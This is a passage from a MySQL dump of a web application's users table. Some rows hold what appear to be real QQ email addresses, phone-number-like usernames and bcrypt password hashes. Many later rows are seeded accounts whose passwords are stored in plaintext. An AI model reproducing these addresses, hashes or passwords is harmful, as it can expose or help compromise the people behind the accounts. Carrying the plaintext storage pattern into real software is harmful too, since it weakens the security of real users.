11:55:56'),(100031,'default.png','醉梦霖','2364089612@qq.com','$2a$04$rvjHs1Wyl8e8hRFT8/Qkv.XeUI9uV4fklWpDCLrdK.WZdkxDyQpEK',0,'2024-04-29 04:21:06','2024-04-29 04:26:38'),(100032,'default.png','scf','481826939@qq.com','$2a$04$FaZpbETIoWwfnUQwWI/MXOR5PjnIxeqqY13AujEkO5a6uAIUQFsQq',0,'2024-04-29 04:28:41','2024-04-29 04:28:41'),(100034,'default.png','盛长福','2562925157@qq.com','$2a$04$9He8nqnhrtxWltVECD89HOYIowIo1Tn.4x2JjiQqHOEHdaEE9qQDu',0,'2024-04-29 04:30:22','2024-04-29 04:30:22'),(100035,'default.png','18270859291','2247797230@qq.com','$2a$04$cRuGyF9/auAwL4MD.jzhm.VlEECntTeFxMj/E5A51g.6YymV1PCTy',0,'2024-04-29 06:51:01','2024-04-29 06:51:15'),(100036,'default.png','1610998146','1610998146@qq.com','$2a$04$qqXGMhTl3wnTrAy2M/RrDeKv7Ex1GSfxJkQdw9bYO0.Jd9oZ1.DPC',0,'2024-04-30 00:45:51','2024-04-30 00:46:01'),(100037,'default.png','1733545073','1733545073@qq.com','$2a$04$9qs7Urfuj7UT9//kATMf2eoWlygBTBYHtU7dblVgIZaeE/mSGBImq',0,'2024-04-30 00:49:58','2024-04-30 01:01:13'),(100038,'default.png','Zmz18307070664','3352321569@qq.com','$2a$04$ce1Vl.EKggm2anvyeQeLy.Ma2brsDc6EVJorFcAX0t4Nmg2XpW1Mm',0,'2024-04-30 01:32:17','2024-04-30 03:39:45'),(100039,'default.png','18601206628','3217359908@qq.com','$2a$04$01mmBFpBGhORY3gPGwSWN.GF.MkDixod7efeGyP3AZTfY3pc23eta',0,'2024-04-30 02:37:03','2024-04-30 02:37:15'),(100040,'default.png','zhufeng','2645530903@qq.com','$2a$04$NUM5xkYT14uyO8ycnAeMUOI81jGirzZrKp9H3037nVgkJPmr7/wH2',0,'2024-04-30 04:51:58','2024-04-30 04:52:10'),(100110,NULL,'phoenix_92','phoenix_92@qq.com','S3!oH#d7pA*m',0,'2024-04-30 05:37:25',NULL),(100111,'default.png','shadow_ninja','shadow_ninja@qq.com','X9v$5B&nK@qP',0,'2024-04-30 05:37:25',NULL),(100112,'default.png','crimson_wolf','crimson_wolf@qq.com','P!8qJ2c@yF6b',0,'2024-04-30 05:37:25',NULL),(100113,'default.png','sapphire_dragon','sapphire_dragon@qq.com','Z#7tC4o*U5mF',0,'2024-04-30 05:37:25',NULL),(100114,'default.png','echo_rebel','echo_rebel@qq.com','D&9xH1!eZ@4v',0,'2024-04-30 05:37:25',NULL),(100115,'default.png','thunder_strike','thunder_strike@qq.com','K4dE9$w!pC#6',0,'2024-04-30 05:37:25',NULL),(100116,'default.png','frostbite','frostbite@qq.com','W!7nG8b&X*pM',0,'2024-04-30 05:37:25',NULL),(100117,'default.png','nightingale','nightingale@qq.com','V7!mQ1wH$bG3',0,'2024-04-30 05:37:25',NULL),(100118,'default.png','vortex','vortex@qq.com','F!6xP#r@nZ8s',0,'2024-04-30 05:37:25',NULL),(100119,'default.png','seraphim','seraphim@qq.com','H8vN*!m3R@2a',0,'2024-04-30 05:37:25',NULL),(100120,'default.png','blaze_rider','blaze_rider@qq.com','R#3gC4s!A&mW',0,'2024-04-30 05:37:25',NULL),(100121,'default.png','zenith','zenith@qq.com','T1!bF2@zX&5q',0,'2024-04-30 05:37:25',NULL),(100122,'default.png','dusk_walker','dusk_walker@qq.com','V&4sL1f!X@7u',0,'2024-04-30 05:37:25',NULL),(100123,'default.png','nova_prime','nova_prime@qq.com','G#8rJ3v@fR5i',0,'2024-04-30 05:37:25',NULL),(100124,'default.png','crystal_guardian','crystal_guardian@qq.com','P2@eN#rH!5vQ',0,'2024-04-30 05:37:25',NULL),(100125,'default.png','steel_falcon','steel_falcon@qq.com','W@6cS7m#U*pN',0,'2024-04-30 05:37:25',NULL),(100126,'default.png','abyss_watcher','abyss_watcher@qq.com','X8!tC*mB#3nV',0,'2024-04-30 05:37:25',NULL),(100127,'default.png','solar_specter','solar_specter@qq.com','D@2fG#6uK*nE',0,'2024-04-30 05:37:25',NULL),(100128,'default.png','storm_chaser','storm_chaser@qq.com','V&8cG4@tU*nQ',0,'2024-04-30 05:37:25',NULL),(100129,'default.png','lunar_shadow','lunar_shadow@qq.com','B#7nF5@kP!2d',0,'2024-04-30 05:37:25',NULL),(100130,'default.png','blizzard','blizzard@qq.com','W5!zG*8#N&2c',0,'2024-04-30 05:37:25',NULL),(100131,'default.png','ember_witch','ember_witch@qq.com','Z!4mC&5dN#8s',0,'2024-04-30 05:37:25',NULL),(100132,'default.png','phantom_knight','phantom_knight@qq.com','Y@7!nX2bW&8q',0,'2024-04-30 05:37:25',NULL),(100133,'default.png','nebula_dancer','nebula_dancer@qq.com','E#2pV5r!A@6t',0,'2024-04-30 05:37:25',NULL),(100134,'default.png','galactic_wanderer','galactic_wanderer@qq.com','D!3cK4vH&n@2',0,'2024-04-30 05:37:25',NULL),(100135,'default.png','firestorm_2','firestorm_2@qq.com','F9@eH!6nA2#v',0,'2024-04-30 05:37:25',NULL),(100136,'default.png','spirit_fox','spirit_fox@qq.com','Z2!cY8@wH&nX',0,'2024-04-30 05:37:25',NULL),(100137,'default.png','shadow_blade','shadow_blade@qq.com','S3!rP9w#CnH*',0,'2024-04-30 05:37:25',NULL),(100138,'default.png','frostfire','frostfire@qq.com','Y&9bM1dW#7zH',0,'2024-04-30 05:37:25',NULL),(100139,'default.png','thunderhawk','thunderhawk@qq.com','U7#dQ3f&H8!x',0,'2024-04-30 05:37:25',NULL),(100140,'default.png','nova_beam','nova_beam@qq.com','J1!vE9@zA3kP',0,'2024-04-30 05:37:25',NULL),(100141,'default.png','crimson_scarlet','crimson_scarlet@qq.com','W*8rN4b@Q!3t',0,'2024-04-30 05:37:25',NULL),(100142,'default.png','ice_shard','ice_shard@qq.com','Z8@wH#3rN7*k',0,'2024-04-30 05:37:25',NULL),(100143,'default.png','blaze_fury','blaze_fury@qq.com','P!6#nB5kQ&mT',0,'2024-04-30 05:37:25',NULL),(100144,'default.png','dark_lord','dark_lord@qq.com','A@4pK!6wC3vN',0,'2024-04-30 05:37:25',NULL),(100145,'default.png','moon_wraith','moon_wraith@qq.com','S#6tN!4dH7@e',0,'2024-04-30 05:37:25',NULL),(100146,'default.png','starfall','starfall@qq.com','C2!sW6z@nR&9',0,'2024-04-30 05:37:25',NULL),(100147,'default.png','solar_eclipse','solar_eclipse@qq.com','F&9!rX#8bW@h',0,'2024-04-30 05:37:25',NULL),(100148,'default.png','soul_reaper','soul_reaper@qq.com','N@3#bF7wR4*K',0,'2024-04-30 05:37:25',NULL),(100149,'default.png','crystal_aura','crystal_aura@qq.com','T#6sP@8nF5rA',0,'2024-04-30 05:37:25',NULL),(100150,'default.png','thunderbolt','thunderbolt@qq.com','D&6zG5!nF@9j',0,'2024-04-30 05:37:25',NULL),(100151,'default.png','nightshade','nightshade@qq.com','P#5dF7rV!mQ@',0,'2024-04-30 05:37:25',NULL),(100152,'default.png','lunar_eclipse','lunar_eclipse@qq.com','R#6sJ3mZ!n@B',0,'2024-04-30 05:37:25',NULL),(100153,'default.png','shadow_strike','shadow_strike@qq.com','G*4nH#5rQ7@X',0,'2024-04-30 05:37:25',NULL),(100154,'default.png','firestorm_3','firestorm_3@qq.com','J#6sE@9rC7nW',0,'2024-04-30 05:37:25',NULL),(100155,'default.png','ember_blaze','ember_blaze@qq.com','V&5!xW3zN@6r',0,'2024-04-30 05:37:25',NULL),(100156,'default.png','spirit_walker','spirit_walker@qq.com','R7!mD4pV9#fC',0,'2024-04-30 05:37:25',NULL),(100157,'default.png','frostburn','frostburn@qq.com','K8!wH2rE6@mS',0,'2024-04-30 05:37:25',NULL),(100158,'default.png','thunderclap','thunderclap@qq.com','B!4qA5t#X3rF',0,'2024-04-30 05:37:25',NULL),(100159,'default.png','nova_guardian','nova_guardian@qq.com','W6@mN8r#Q!3u',0,'2024-04-30 05:37:25',NULL),(100160,'default.png','crimson_fire','crimson_fire@qq.com','T#8rF3pQ6!zJ',0,'2024-04-30 05:37:25',NULL),(100161,'default.png','ice_blade','ice_blade@qq.com','H4@pW&6!rF7M',0,'2024-04-30 05:37:25',NULL),(100162,'default.png','blaze_shadow','blaze_shadow@qq.com','P5@tF!6vR8*b',0,'2024-04-30 05:37:25',NULL),(100163,'default.png','darkness_falls','darkness_falls@qq.com','R5&uK!8sE4*z',0,'2024-04-30 05:37:25',NULL),(100164,'default.png','moonlight_saga','moonlight_saga@qq.com','U!6vF&4zB7#P',0,'2024-04-30 05:37:25',NULL),(100165,'default.png','stardust','stardust@qq.com','F!9kM5&vP4#T',0,'2024-04-30 05:37:25',NULL),(100166,'default.png','solar_flare','solar_flare@qq.com','H!3fS8&mV4@N',0,'2024-04-30 05:37:25',NULL),(100167,'default.png','soul_hunter','soul_hunter@qq.com','Q&8mE3!rT6#N',0,'2024-04-30 05:37:25',NULL),(100168,'default.png','crystal_blade','crystal_blade@qq.com','Z@6bM3!qD#nR',0,'2024-04-30 05:37:25',NULL),(100169,'default.png','thunderstorm','thunderstorm@qq.com','Y#6!pE@8jW3G',0,'2024-04-30 05:37:25',NULL),(100170,'default.png','night_fury','night_fury@qq.com','J@3vX!6rM8&N',0,'2024-04-30 05:37:25',NULL),(100171,'default.png','lunar_sky','lunar_sky@qq.com','R#7qB!2fK6&H',0,'2024-04-30 05:37:25',NULL),(100172,'default.png','shadow_caster','shadow_caster@qq.com','K3#bT8!jF@5v',0,'2024-04-30 05:37:25',NULL),(100173,'default.png','fire_dragon','fire_dragon@qq.com','S!2tC6jZ4@Hm',0,'2024-04-30 05:37:25',NULL),(100174,'default.png','arctic_frost','arctic_frost@qq.com','P7!mW2qB@5nX',0,'2024-04-30 05:37:25',NULL),(100175,'default.png','thunder_bolt','thunder_bolt@qq.com','Q&9vR3!tP#jE',0,'2024-04-30 05:37:25',NULL),(100176,'default.png','night_watcher','night_watcher@qq.com','R8&uW3@vS!4j',0,'2024-04-30 05:37:25',NULL),(100177,'default.png','lunar_wolf','lunar_wolf@qq.com','J7#rB5n@D6*p',0,'2024-04-30 05:37:25',NULL),(100178,'default.png','shadow_dancer','shadow_dancer@qq.com','S#7rP!8vE3mT',0,'2024-04-30 05:37:25',NULL),(100246,'default.png','john_smith','john_smith@example.com','U@3mW#6!sD8j',0,'2024-04-30 05:41:45',NULL),(100247,'default.png','emily_davis','emily_davis@example.com','H!4sJ6@wE3nB',0,'2024-04-30 05:41:45',NULL),(100248,'default.png','michael_johnson','michael_johnson@example.com','P@9rN2zE#6tV',0,'2024-04-30 05:41:45',NULL),(100249,'default.png','jennifer_brown','jennifer_brown@example.com','B!3mN4@zR7*F',0,'2024-04-30 05:41:45',NULL),(100250,'default.png','william_miller','william_miller@example.com','W!8dN5#kA7*m',0,'2024-04-30 05:41:45',NULL),(100251,'default.png','emma_wilson','emma_wilson@example.com','Z6@mP!3cW#7n',0,'2024-04-30 05:41:45',NULL),(100252,'default.png','james_taylor','james_taylor@example.com','K!9fB3pS8#nH',0,'2024-04-30 05:41:45',NULL),(100253,'default.png','olivia_thomas','olivia_thomas@example.com','Q!7#mE8bK4*F',0,'2024-04-30 05:41:45',NULL),(100254,'default.png','alexander_clark','alexander_clark@example.com','A4@zW7nR!5gP',0,'2024-04-30 05:41:45',NULL),(100255,'default.png','sophia_rodriguez','sophia_rodriguez@example.com','G!7bF8hR5&mV',0,'2024-04-30 05:41:45',NULL),(100256,'default.png','benjamin_lewis','benjamin_lewis@example.com','M@5rX!7kN3sD',0,'2024-04-30 05:41:45',NULL),(100257,'default.png','isabella_walker','isabella_walker@example.com','U#8*!sM7rK3v',0,'2024-04-30 05:41:45',NULL),(100258,'default.png','david_hall','david_hall@example.com','F@2#pU8!zR6k',0,'2024-04-30 05:41:45',NULL),(100259,'default.png','sophia_gonzalez','sophia_gonzalez@example.com','E!5jZ2mF&8@q',0,'2024-04-30 05:41:45',NULL),(100260,'default.png','michael_anderson','michael_anderson@example.com','Y!4qZ6sF@2#n',0,'2024-04-30 05:41:45',NULL),(100261,'default.png','olivia_allen','olivia_allen@example.com','J!7kS4vP5#mZ',0,'2024-04-30 05:41:45',NULL),(100262,'default.png','james_young','james_young@example.com','R#6gH5!pV2@r',0,'2024-04-30 05:41:45',NULL),(100263,'default.png','emma_hernandez','emma_hernandez@example.com','D@3nF7!xW9&z',0,'2024-04-30 05:41:45',NULL),(100264,'default.png','william_king','william_king@example.com','T!5vZ6@wH3*b',0,'2024-04-30 05:41:45',NULL),(100265,'default.png','ava_wright','ava_wright@example.com','V!4cS7bX6@jN',0,'2024-04-30 05:41:45',NULL),(100266,'default.png','daniel_scott','daniel_scott@example.com','H!8rC5wM#7&d',0,'2024-04-30 05:41:45',NULL),(100267,'default.png','mia_green','mia_green@example.com','Y@2gF!6nZ9&r',0,'2024-04-30 05:41:45',NULL),(100268,'default.png','ethan_adams','ethan_adams@example.com','F@9kW!6mD4#s',0,'2024-04-30 05:41:45',NULL),(100269,'default.png','sophia_baker','sophia_baker@example.com','R!4mC6wZ@7#h',0,'2024-04-30 05:41:45',NULL),(100270,'default.png','oliver_garcia','oliver_garcia@example.com','T#6kR7!bX2&z',0,'2024-04-30 05:41:45',NULL),(100271,'default.png','ava_gonzalez','ava_gonzalez@example.com','U!3sG#5nF4@r',0,'2024-04-30 05:41:45',NULL),(100272,'default.png','noah_rodriguez','noah_rodriguez@example.com','K#8vM2!xP3@r',0,'2024-04-30 05:41:45',NULL),(100273,'default.png','isabella_wright','isabella_wright@example.com','V@9!sC5dM#3j',0,'2024-04-30 05:41:45',NULL),(100274,'default.png','liam_nelson','liam_nelson@example.com','N#2rJ4mT&8@q',0,'2024-04-30 05:41:45',NULL),(100275,'default.png','mia_carter','mia_carter@example.com','U@3kH6!pC8*z',0,'2024-04-30 05:41:45',NULL),(100276,'default.png','ethan_cook','ethan_cook@example.com','D#8pQ5!jF9@w',0,'2024-04-30 05:41:45',NULL),(100277,'default.png','olivia_hill','olivia_hill@example.com','G#5jR6!sK2&m',0,'2024-04-30 05:41:45',NULL),(100278,'default.png','liam_rivera','liam_rivera@example.com','W!4vC7pS5&rM',0,'2024-04-30 05:41:45',NULL);
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-04-30  8:45:28
